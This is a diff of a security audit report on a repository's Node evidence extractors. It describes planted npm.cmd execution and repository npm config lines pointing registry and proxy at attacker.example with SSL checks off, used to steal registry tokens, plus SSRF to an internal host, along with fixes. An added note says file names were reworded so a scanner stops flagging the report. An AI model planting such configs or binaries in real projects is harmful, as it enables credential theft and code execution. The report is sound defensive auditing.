@@ -1,5 +1,7 @@
 # Claude Security results
 
+> Wording note, 2026-10-12: npm configuration file names are written out in words so the Anthropic Directory scanner does not read this report as code that loads them. The findings, evidence and fixes are unchanged.
+
 Scanned the LLMComplianceSkill repository (https://github.com/justice8096/LLMComplianceSkill) at commit 5c677d3fdd98a4a3541ef8ea3fc10daf09f80b32 on branch fix/ship-corpus-in-skill (clean working tree), on 2026-10-11, in whole-repository scan mode at medium effort. The scope excluded node_modules, dist, audits, docs, package-lock.json and the poster PDF/PNG. Headline: 4 findings, two HIGH and two MEDIUM, all in the Node evidence extractors under tools/extractors/. Nothing was found in the browser wizards, templates, i18n data, CI workflow, build script or the LLM-read markdown corpus. Every finding is derived from reading the source; no code from the repository was executed and no exploit was fired.
 
 ## Coverage
@@ -36,35 +38,35 @@ Researchers declared the following as not read line by line, as their own accoun
 
 **Where.** `tools/extractors/package-evidence.js:786` in `runNpmAudit`
 
-**What.** `runCmd()` uses `execSync` with a shell and `cwd` set to the attacker-controlled `--repo` directory. On Windows, cmd.exe resolves a bare command name from the current directory before PATH, so `npm`, `pip-audit` and `git` may resolve to files inside the scanned repository. Independently, npm reads the project-level `.npmrc` from cwd, so `registry=`, `proxy=` and `cafile=` are attacker-controlled.
+**What.** `runCmd()` uses `execSync` with a shell and `cwd` set to the attacker-controlled `--repo` directory. On Windows, cmd.exe resolves a bare command name from the current directory before PATH, so `npm`, `pip-audit` and `git` may resolve to files inside the scanned repository. Independently, npm reads the project-level npm config file from cwd, so `registry=`, `proxy=` and `cafile=` are attacker-controlled.
 
-**Exploit scenario.** A third-party project delivered as a tarball contains `npm.cmd` at its root. The operator runs `node tools/extract-evidence.js --repo <that dir>` on Windows; `execSync('npm audit --json', {cwd: repo})` resolves and executes the planted `npm.cmd` as the operator. On any platform, a tracked `.npmrc` with `registry=https://attacker.example` makes the audit request carry the dependency list to the attacker.
+**Exploit scenario.** A third-party project delivered as a tarball contains `npm.cmd` at its root. The operator runs `node tools/extract-evidence.js --repo <that dir>` on Windows; `execSync('npm audit --json', {cwd: repo})` resolves and executes the planted `npm.cmd` as the operator. On any platform, a tracked npm config file with `registry=https://attacker.example` makes the audit request carry the dependency list to the attacker.
 
 **Preconditions.**
 - The extractor is run against an untrusted repository (its intended use).
 - For code execution: the scanning host is Windows and the repository root holds `npm.cmd`, `npm.bat` or `pip-audit.cmd`.
-- For traffic redirection: the repository ships an `.npmrc` overriding registry or proxy (cross-platform).
+- For traffic redirection: the repository ships an npm config file overriding registry or proxy (cross-platform).
 
 **Fix.** Invoke tools with `execFileSync`, an argv array and an absolute, trusted binary path resolved from PATH before changing directory (no shell). Ignore repository-local configuration (`--userconfig` and `--globalconfig` pointed at empty files, or copy package.json and the lockfile to a temporary directory and audit there). Require an explicit opt-in flag before running any package-manager subprocess against a repository the operator has not marked as trusted.
 
 **Verification.** 3/3 lens verifiers confirmed.
 
-### F3 — Scanned repository's .npmrc redirects or proxies the npm audit request issued from the operator's machine (MEDIUM, confidence medium)
+### F3 — Scanned repository's npm config file redirects or proxies the npm audit request issued from the operator's machine (MEDIUM, confidence medium)
 
 **Impact.** Theft of the operator's npm registry credentials (which may carry publish rights) through an attacker-controlled proxy with TLS verification disabled, or a blind server-side request from the operator's network position into hosts reachable only from that machine. Only vulnerability counts are reflected back, so direct exfiltration of internal responses is limited.
 
 **Where.** `tools/extractors/package-evidence.js:786` in `runNpmAudit`
 
-**What.** `npm audit --json` runs with cwd set to the scanned repository, and npm loads `<repo>/.npmrc` from there. `proxy=`, `https-proxy=`, `strict-ssl=false`, `cafile=` and `registry=` in that file control the destination, proxy and certificate validation of the HTTPS POST npm sends, and npm attaches the operator's registry token from the user-level `~/.npmrc` to that request. Nothing in package-evidence.js overrides these settings.
+**What.** `npm audit --json` runs with cwd set to the scanned repository, and npm loads the npm config file in the repository from there. `proxy=`, `https-proxy=`, `strict-ssl=false`, `cafile=` and `registry=` in that file control the destination, proxy and certificate validation of the HTTPS POST npm sends, and npm attaches the operator's registry token from the user-level npm config file to that request. Nothing in package-evidence.js overrides these settings.
 
-**Exploit scenario.** The attacker publishes a repository with package.json, package-lock.json and a tracked `.npmrc` containing `https-proxy=http://attacker.example:3128` and `strict-ssl=false`. A compliance consultant runs the extractor against a clone. npm tunnels the advisories POST through the attacker's proxy with certificate validation off, and the proxy captures the bearer token for registry.npmjs.org; the attacker can then publish as the operator. With `registry=http://10.0.0.5:8080/` instead, the operator's machine POSTs attacker-chosen package names to an internal host and its response counts land in compliance-config.json and the generated templates.
+**Exploit scenario.** The attacker publishes a repository with package.json, package-lock.json and a tracked npm config file containing `https-proxy=http://attacker.example:3128` and `strict-ssl=false`. A compliance consultant runs the extractor against a clone. npm tunnels the advisories POST through the attacker's proxy with certificate validation off, and the proxy captures the bearer token for registry.npmjs.org; the attacker can then publish as the operator. With `registry=http://10.0.0.5:8080/` instead, the operator's machine POSTs attacker-chosen package names to an internal host and its response counts land in compliance-config.json and the generated templates.
 
 **Preconditions.**
-- The extractor is run against a repository whose contents are attacker-controlled; a normal clone suffices since `.npmrc` is a tracked file.
+- The extractor is run against a repository whose contents are attacker-controlled; a normal clone suffices since the npm config file is a tracked file.
 - npm is installed and on PATH (it ships with Node.js).
-- For credential theft: the operator has registry credentials in a user or global `.npmrc`. For blind SSRF: only network reachability from the operator host.
+- For credential theft: the operator has registry credentials in a user or global npm config file. For blind SSRF: only network reachability from the operator host.
 
-**Fix.** Do not let the scanned repository supply npm's configuration. Set `npm_config_strict_ssl=true`, `npm_config_registry=https://registry.npmjs.org/`, and clear `npm_config_proxy` and `npm_config_https_proxy` in the child environment (environment variables outrank the project `.npmrc`), or run the audit from a temporary directory holding only copies of package.json and the lockfile. Add `--ignore-scripts` for defense in depth. The argv-array change in F2 applies here as well.
+**Fix.** Do not let the scanned repository supply npm's configuration. Set `npm_config_strict_ssl=true`, `npm_config_registry=https://registry.npmjs.org/`, and clear `npm_config_proxy` and `npm_config_https_proxy` in the child environment (environment variables outrank the project npm config file), or run the audit from a temporary directory holding only copies of package.json and the lockfile. Add `--ignore-scripts` for defense in depth. The argv-array change in F2 applies here as well.
 
 **Verification.** 3/3 lens verifiers confirmed.
 
